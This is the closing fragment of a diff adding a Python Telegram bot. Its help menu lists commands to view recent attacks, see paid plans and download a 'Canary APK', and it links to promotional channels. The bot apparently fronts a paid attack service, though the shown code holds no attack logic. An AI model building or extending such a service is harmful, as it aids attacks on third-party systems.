+    response += '/mylogs :--> 𝐕𝐢𝐞𝐰 𝐫𝐞𝐜𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n'
+    response += '/plan :--> 𝐕𝐢𝐞𝐰 𝐩𝐫𝐢𝐜𝐞𝐬 𝐭𝐨 𝐩𝐞𝐫𝐬𝐨𝐧𝐚𝐥\n'
+    response += '/canary :--> 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐂𝐀𝐍𝐀𝐑𝐘 𝐀𝐏𝐊\n'
+    response += '/admincmd :--> 𝐕𝐢𝐞𝐰 𝐚𝐝𝐦𝐢𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n\n'
+    response += '𝐅𝐨𝐫 𝐡𝐞𝐥𝐩 𝐚𝐧𝐝 𝐮𝐩𝐝𝐚𝐭𝐞𝐬 𝐜𝐥𝐢𝐜𝐤 𝐛𝐞𝐥𝐨𝐰 𝐛𝐮𝐭𝐭𝐨𝐧𝐬\n'
+    
+    keyboard = telebot.types.InlineKeyboardMarkup()
+    keyboard.row(
+        telebot.types.InlineKeyboardButton('UPDATES', url='https://t.me/RRAJARAJ_04'),
+        telebot.types.InlineKeyboardButton('SUPPORT', url='https://t.me/RAJARAJ_05')  
+    )
+
+    bot.reply_to(message, response, reply_markup=keyboard)
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# Start the bot
+while True:
+    try:
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(e)
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
+# RRAJARAJ_04 JOIN TO MORE UPDATES 
